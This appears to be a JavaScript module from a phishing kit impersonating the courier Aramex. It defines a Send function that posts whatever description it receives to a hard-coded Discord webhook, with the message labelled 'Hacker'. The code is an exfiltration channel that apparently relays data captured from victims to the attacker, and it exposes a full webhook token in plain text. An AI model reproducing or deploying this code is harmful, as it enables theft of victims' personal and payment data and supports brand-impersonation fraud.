import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324753686932623491/FK5AsgzmsBIvNjwBSm_ZfwXJ_-SA6fHwOhDd44MemU06JUoNVa1YlqDrDWCxry5IEN7l",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
